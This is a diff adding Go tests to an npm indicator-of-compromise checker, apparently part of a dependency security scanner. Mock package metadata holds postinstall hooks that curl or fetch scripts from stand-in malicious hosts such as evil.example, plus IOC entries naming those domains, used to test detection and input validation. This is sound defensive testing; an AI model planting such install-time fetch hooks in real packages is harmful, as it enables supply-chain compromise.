@@ -149,6 +149,37 @@ func TestNPMIOCChecker_SuspiciousDomainIOC_Finding(t *testing.T) {
 	assert.Contains(t, issues[0].Description, "evil.example")
 }
 
+func TestNPMIOCChecker_DomainIOCDoesNotMatchSubstringHost(t *testing.T) {
+	checker := analyzer.NewNPMIOCCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
+		"axios@1.14.1": {
+			Name:    "axios",
+			Version: "1.14.1",
+			Scripts: map[string]string{
+				"postinstall": "curl -fsSL https://not-evil.example/payload.sh",
+			},
+		},
+	}, nil)
+
+	tool := model.UnifiedTool{
+		Name: "deploy_site",
+		Metadata: map[string]any{
+			"dependencies": []any{
+				map[string]any{"name": "axios", "version": "1.14.1", "ecosystem": "npm"},
+			},
+		},
+	}
+
+	index, err := analyzer.BuildNPMIOCIndexForRuntimeTest([]byte(`[
+		{"ecosystem":"npm","ioc_type":"domain","value":"evil.example","match":"contains","reason":"Known malicious delivery domain","confidence":"high"}
+	]`))
+	require.NoError(t, err)
+	checker = analyzer.NewNPMIOCCheckerWithIndexForTest(checker, index)
+
+	issues, err := checker.Check(tool)
+	require.NoError(t, err)
+	assert.Empty(t, issues)
+}
+
 func TestNPMIOCChecker_SuspiciousURLIOC_Finding(t *testing.T) {
 	checker := analyzer.NewNPMIOCCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
 		"axios@1.14.1": {
@@ -156,6 +187,38 @@ func TestNPMIOCChecker_SuspiciousURLIOC_Finding(t *testing.T) {
 			Version: "1.14.1",
 			Scripts: map[string]string{
 				"postinstall": "node -e \"fetch('https://evil.example/bootstrap.js')\"",
+			},
+		},
+	}, nil)
+
+	tool := model.UnifiedTool{
+		Name: "deploy_site",
+		Metadata: map[string]any{
+			"dependencies": []any{
+				map[string]any{"name": "axios", "version": "1.14.1", "ecosystem": "npm"},
+			},
+		},
+	}
+
+	original := `[{"ecosystem":"npm","ioc_type":"url","value":"https://evil.example/bootstrap.js","match":"exact","reason":"Known malicious bootstrap URL","confidence":"high"}]`
+	index, err := analyzer.BuildNPMIOCIndexForRuntimeTest([]byte(original))
+	require.NoError(t, err)
+	checker = analyzer.NewNPMIOCCheckerWithIndexForTest(checker, index)
+
+	issues, err := checker.Check(tool)
+	require.NoError(t, err)
+	require.Len(t, issues, 1)
+	assert.Equal(t, "NPM_IOC_INDICATOR", issues[0].Code)
+	assert.Contains(t, issues[0].Description, "https://evil.example/bootstrap.js")
+}
+
+func TestNPMIOCChecker_ProtocolRelativeURLIOC_Finding(t *testing.T) {
+	checker := analyzer.NewNPMIOCCheckerWithMock(map[string]analyzer.NPMVersionResponseForTest{
+		"axios@1.14.1": {
+			Name:    "axios",
+			Version: "1.14.1",
+			Scripts: map[string]string{
+				"postinstall": "node -e \"fetch('//evil.example/bootstrap.js')\"",
 			},
 		},
 	}, nil)
@@ -212,4 +275,16 @@ func TestBuildNPMIOCIndex_EmbeddedData_LoadsKnownIOC(t *testing.T) {
 	entry, ok := idx["plain-crypto-js"]
 	require.True(t, ok)
 	assert.Equal(t, "high", entry.Confidence)
+}
+
+func TestBuildNPMIOCIndex_RejectsTopLevelNull(t *testing.T) {
+	_, err := analyzer.BuildNPMIOCIndexForTest([]byte("null"))
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "npm_ioc: top-level JSON value must be an array")
+}
+
+func TestBuildNPMIOCIndex_RejectsTopLevelObject(t *testing.T) {
+	_, err := analyzer.BuildNPMIOCIndexForTest([]byte(`{}`))
+	require.Error(t, err)
+	assert.Contains(t, err.Error(), "npm_ioc: top-level JSON value must be an array")
 }
